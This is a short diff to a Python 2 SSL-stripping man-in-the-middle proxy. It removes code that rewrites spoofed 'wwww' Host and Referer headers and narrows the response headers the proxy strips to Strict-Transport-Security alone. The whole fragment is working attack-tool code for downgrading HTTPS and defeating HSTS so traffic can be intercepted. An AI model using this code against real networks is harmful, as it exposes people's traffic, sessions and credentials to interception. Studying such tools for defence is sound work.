@@ -68,20 +68,6 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 		modified = False
 		print "[+] Original Headers:"
 		print req.headers
-		try:
-			if req.headers['Referer'].startswith("http://wwww"):
-				req.headers['Referer'] = "https://www." + req.headers['Referer'].split(".",1)[1]
-		except:
-			pass
-		try:
-			if req.headers['Host'].startswith("wwww"):
-				req.headers['Host'] = str(req.headers['Host'])[1:]
-				modified = True
-		except:
-			pass
-		if modified:
-			print "[+] Modified Headers: "
-			print req.headers
 	if req_body:
 		print "\n[+]Original Body:"
 		print req_body
@@ -91,7 +77,7 @@ class SSLStripRequestHandler(ProxyRequestHandler):
 	if res.headers:
 		modified = False
 		#Protection Headers to Strip
-		protection_headers = ['Strict-Transport-Security','Alt-Svc','Set-Cookie']
+		protection_headers = ['Strict-Transport-Security']
 
 		print "\n[+] Original Headers:"
 		print res.headers
